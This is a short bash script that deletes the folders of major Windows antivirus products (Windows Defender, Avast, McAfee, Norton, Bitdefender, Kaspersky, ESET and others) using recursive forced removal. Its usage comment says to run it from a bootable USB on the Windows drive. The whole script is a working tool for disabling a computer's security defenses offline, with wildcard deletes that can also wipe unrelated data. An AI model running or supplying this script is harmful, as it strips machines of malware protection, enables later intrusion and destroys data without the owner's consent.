#!/bin/bash
# Bash script to quickly delete various windows AV programs
# Usage: open up terminal in a windows main drive with a bootable usb and run script
echo -e  "Initiating the Deleto... "
find -type d -iname *Windows\ Defender* -exec rm -rf {} \;
find -type d -iname *Avast* -exec rm -rf {} \;
find -type d -iname *McAfee* -exec rm -rf {} \;
find -type d -iname *Norton* -exec rm -rf {} \;
find -type d -iname *Webroot* -exec rm -rf {} \;
find -type d -iname *Bitdefender* -exec rm -rf {} \;
find -type d -iname *Kaspersky* -exec rm -rf {} \;
find -type d -iname *ESET* -exec rm -rf {} \;
find -type d -iname *Trend\ Micro* -exec rm -rf {} \;

